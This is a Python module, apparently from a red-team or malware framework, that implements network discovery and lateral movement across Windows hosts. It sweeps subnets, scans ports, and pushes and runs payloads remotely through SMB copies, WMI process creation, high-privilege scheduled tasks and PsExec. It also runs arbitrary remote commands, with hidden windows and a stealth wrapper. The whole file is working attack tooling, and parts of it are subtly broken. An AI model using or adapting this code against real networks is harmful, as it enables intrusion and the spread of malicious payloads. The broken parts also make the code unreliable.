# Lateral Movement Module
# Implements lateral movement capabilities for red team operations

import os
import sys
import json
import time
import socket
import subprocess
import threading
from datetime import datetime
from config import DEBUG_MODE, MITRE_TECHNIQUES
from core.stealth import stealth_manager

class LateralMovement:
    """Handles lateral movement to other systems"""
    
    def __init__(self):
        self.is_windows = sys.platform == "win32"
        self.movement_history = []
        self.credentials = {}
        self.discovered_targets = []
        
    def discover_network_targets(self):
        """Discover potential targets on the network"""
        targets = {
            'timestamp': datetime.now().isoformat(),
            'hosts': [],
            'shares': [],
            'services': []
        }
        
        try:
            # Host discovery via ping sweep
            hosts = self._ping_sweep_network()
            if hosts:
                targets['hosts'] = hosts
            
            # SMB share discovery
            shares = self._discover_smb_shares()
            if shares:
                targets['shares'] = shares
            
            # Service discovery
            services = self._discover_services()
            if services:
                targets['services'] = services
            
            self.discovered_targets = targets
            
            self._log_technique('T1018', True, {
                'hosts_found': len(hosts),
                'shares_found': len(shares)
            })
            
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Network discovery failed: {e}")
                )
            self._log_technique('T1018', False, {'error': str(e)})
        
        return targets
    
    def _ping_sweep_network(self):
        """Perform ping sweep to discover hosts"""
        hosts = []
        
        try:
            # Get local network configuration
            import psutil
            
            for interface, addrs in psutil.net_if_addrs().items():
                for addr in addrs:
                    if addr.family == socket.AF_INET:
                        ip = addr.address
                        netmask = addr.netmask
                        
                        # Skip loopback
                        if ip.startswith('127.'):
                            continue
                        
                        # Calculate network range
                        network = self._calculate_network(ip, netmask)
                        if network:
                            # Scan the network
                            discovered = self._ping_range(network)
                            hosts.extend(discovered)
            
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Ping sweep failed: {e}")
                )
        
        return hosts
    
    def _calculate_network(self, ip, netmask):
        """Calculate network address from IP and netmask"""
        try:
            ip_parts = list(map(int, ip.split('.')))
            mask_parts = list(map(int, netmask.split('.')))
            
            network = '.'.join(str(ip_parts[i] & mask_parts[i]) for i in range(4))
            
            # Count hosts
            host_bits = 32 - sum(bin(m).count('1') for m in mask_parts)
            
            if host_bits > 0 and host_bits <= 10:
                return {
                    'network': network,
                    'mask': netmask,
                    'host_count': 2 ** host_bits
                }
            
            return None
            
        except Exception:
            return None
    
    def _ping_range(self, network_info):
        """Ping a range of addresses"""
        hosts = []
        
        try:
            network = network_info['network']
            parts = network.split('.')
            base = '.'.join(parts[:3])
            
            # Limit to reasonable range
            for i in range(1, 255):
                target = f"{base}.{i}"
                
                # Ping with timeout
                result = subprocess.run(
                    ['ping', '-n', '1', '-w', '100', target],
                    capture_output=True,
                    text=True,
                    creationflags=subprocess.CREATE_NO_WINDOW if self.is_windows else 0
                )
                
                if result.returncode == 0:
                    # Host responded
                    hostname = self._resolve_hostname(target)
                    hosts.append({
                        'ip': target,
                        'hostname': hostname,
                        'os_hint': self._guess_os_from_ping(result.stdout)
                    })
        
        except Exception:
            pass
        
        return hosts
    
    def _resolve_hostname(self, ip):
        """Resolve IP to hostname"""
        try:
            return socket.gethostbyaddr(ip)[0]
        except Exception:
            return None
    
    def _guess_os_from_ping(self, ping_output):
        """Guess OS from ping response"""
        if 'TTL=64' in ping_output:
            return 'Linux/Unix'
        elif 'TTL=128' in ping_output:
            return 'Windows'
        elif 'TTL=32' in ping_output:
            return 'Windows XP/2003'
        return 'Unknown'
    
    def _discover_smb_shares(self):
        """Discover SMB shares on the network"""
        shares = []
        
        if not self.is_windows:
            return shares
        
        try:
            # Get local shares
            result = subprocess.run(
                ['net', 'share'],
                capture_output=True,
                text=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    if ' Disk' in line or ' IPC' in line:
                        parts = line.split()
                        if parts:
                            share_name = parts[0]
                            path = parts[2] if len(parts) > 2 else ''
                            shares.append({
                                'name': share_name,
                                'path': path,
                                'type': 'local'
                            })
            
            # Discover remote shares via browsing
            result = subprocess.run(
                ['net', 'view', '/all'],
                capture_output=True,
                text=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    if line.startswith('\\\\'):
                        server = line.strip()
                        shares.append({
                            'server': server,
                            'type': 'remote_server'
                        })
                        
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"SMB share discovery failed: {e}")
                )
        
        return shares
    
    def _discover_services(self):
        """Discover network services"""
        services = []
        
        try:
            # Common ports to check
            common_ports = [22, 80, 443, 445, 3389, 8080, 1433, 3306]
            
            for host in self.discovered_targets:
                if isinstance(host, dict) and 'ip' in host:
                    ip = host['ip']
                    for port in common_ports:
                        if self._check_port(ip, port):
                            services.append({
                                'host': ip,
                                'port': port,
                                'service': self._get_service_name(port)
                            })
                        
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Service discovery failed: {e}")
                )
        
        return services
    
    def _check_port(self, host, port):
        """Check if a port is open"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((host, port))
            sock.close()
            return result == 0
        except Exception:
            return False
    
    def _get_service_name(self, port):
        """Get common service name for port"""
        services = {
            22: 'SSH',
            80: 'HTTP',
            443: 'HTTPS',
            445: 'SMB',
            3389: 'RDP',
            8080: 'HTTP-Alt',
            1433: 'MSSQL',
            3306: 'MySQL'
        }
        return services.get(port, 'Unknown')
    
    def move_via_smb(self, target, share_path, payload_path, credentials=None):
        """Move laterally via SMB by copying payload"""
        result = {
            'target': target,
            'method': 'smb_copy',
            'success': False,
            'timestamp': datetime.now().isoformat()
        }
        
        try:
            if credentials:
                # Use provided credentials
                username = credentials.get('username', '')
                password = credentials.get('password', '')
                domain = credentials.get('domain', '')
                
                # Copy payload to share
                dest = f"\\\\{target}\\{share_path}"
                
                result_cmd = subprocess.run(
                    ['copy', payload_path, dest],
                    capture_output=True,
                    text=True,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                
                if result_cmd.returncode == 0:
                    result['success'] = True
                    result['destination'] = dest
            
            self.movement_history.append(result)
            
            self._log_technique('T1021.002', result['success'], {
                'target': target,
                'method': 'smb'
            })
            
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"SMB lateral movement failed: {e}")
                )
            result['error'] = str(e)
        
        return result
    
    def move_via_wmi(self, target, payload_path, credentials=None):
        """Move laterally via WMI (Windows Management Instrumentation)"""
        result = {
            'target': target,
            'method': 'wmi',
            'success': False,
            'timestamp': datetime.now().isoformat()
        }
        
        if not self.is_windows:
            return result
        
        try:
            # Check for admin access via WMI
            wmic_command = f'\\\\{target}\\root\\cimv2:Win32_Process'
            
            # Create remote process via WMI
            ps_command = f'''
            $cred = New-Object System.Management.ManagementObject
            ("\\\\{target}\\root\\cimv2:Win32_Process")
            
            $result = $cred.Create(
                "cmd /c {payload_path}",
                "C:\\Windows\\System32",
                $null
            )
            
            $result.ReturnValue
            '''
            
            proc = subprocess.run(
                ['powershell', '-Command', ps_command],
                capture_output=True,
                text=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            if proc.returncode == 0:
                result['success'] = True
            
            self.movement_history.append(result)
            
            self._log_technique('T1047', result['success'], {
                'target': target,
                'method': 'wmi'
            })
            
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"WMI lateral movement failed: {e}")
                )
            result['error'] = str(e)
        
        return result
    
    def move_via_scheduled_task(self, target, payload_path, task_name, credentials=None):
        """Create scheduled task on remote system"""
        result = {
            'target': target,
            'method': 'scheduled_task',
            'success': False,
            'timestamp': datetime.now().isoformat()
        }
        
        if not self.is_windows:
            return result
        
        try:
            # Copy payload to target
            temp_path = f"C:\\Windows\\Temp\\{os.path.basename(payload_path)}"
            
            copy_result = subprocess.run(
                ['copy', payload_path, f"\\\\{target}\\C$\\Windows\\Temp\\"],
                capture_output=True,
                text=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            if copy_result.returncode != 0:
                result['error'] = 'Failed to copy payload'
                return result
            
            # Create scheduled task
            cmd = [
                'schtasks', '/create',
                '/s', target,
                '/tn', task_name,
                '/tr', f'C:\\Windows\\Temp\\{os.path.basename(payload_path)}',
                '/sc', 'once',
                '/st', '00:00',
                '/rl', 'highest'
            ]
            
            if credentials:
                cmd.extend(['/u', credentials.get('username', '')])
                cmd.extend(['/p', credentials.get('password', '')])
            
            proc = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            if proc.returncode == 0:
                result['success'] = True
                result['task_name'] = task_name
            
            self.movement_history.append(result)
            
            self._log_technique('T1053.005', result['success'], {
                'target': target,
                'method': 'scheduled_task'
            })
            
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Scheduled task lateral movement failed: {e}")
                )
            result['error'] = str(e)
        
        return result
    
    def move_via_psexec(self, target, payload_path, credentials=None):
        """Move laterally using PsExec-style execution"""
        result = {
            'target': target,
            'method': 'psexec',
            'success': False,
            'timestamp': datetime.now().isoformat()
        }
        
        if not self.is_windows:
            return result
        
        try:
            # PsExec command structure
            cmd = [
                'psexec', '-s',
                f'\\\\{target}',
                '-c', payload_path
            ]
            
            if credentials:
                cmd.extend(['-u', credentials.get('username', '')])
                cmd.extend(['-p', credentials.get('password', '')])
            
            proc = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            if proc.returncode == 0:
                result['success'] = True
            
            self.movement_history.append(result)
            
            self._log_technique('T1021.002', result['success'], {
                'target': target,
                'method': 'psexec'
            })
            
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"PsExec lateral movement failed: {e}")
                )
            result['error'] = str(e)
        
        return result
    
    def execute_remote_command(self, target, command, credentials=None):
        """Execute command on remote system via WMI"""
        result = {
            'target': target,
            'command': command,
            'method': 'wmi_exec',
            'success': False,
            'output': None,
            'timestamp': datetime.now().isoformat()
        }
        
        if not self.is_windows:
            return result
        
        try:
            ps_command = f'''
            $process = [WMICLASS] "\\\\{target}\\root\\cimv2:Win32_Process"
            $result = $process.Create("cmd /c {command}")
            $result.ReturnValue
            '''
            
            proc = subprocess.run(
                ['powershell', '-Command', ps_command],
                capture_output=True,
                text=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            if proc.returncode == 0:
                result['success'] = True
                result['output'] = proc.stdout
            
            self.movement_history.append(result)
            
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Remote command execution failed: {e}")
                )
            result['error'] = str(e)
        
        return result
    
    def set_credentials(self, username, password, domain=''):
        """Store credentials for lateral movement"""
        self.credentials = {
            'username': username,
            'password': password,
            'domain': domain
        }
    
    def clear_credentials(self):
        """Clear stored credentials"""
        self.credentials = {}
    
    def get_movement_history(self):
        """Get history of lateral movement attempts"""
        return self.movement_history.copy()
    
    def _log_technique(self, technique_id, success, details):
        """Log MITRE ATT&CK technique execution"""
        if DEBUG_MODE:
            technique_name = MITRE_TECHNIQUES.get(technique_id, 'Unknown')
            stealth_manager.safe_execute(
                lambda: print(f"Technique {technique_id} ({technique_name}): {'Success' if success else 'Failed'}")
            )

# Global lateral movement instance
lateral_movement = LateralMovement()
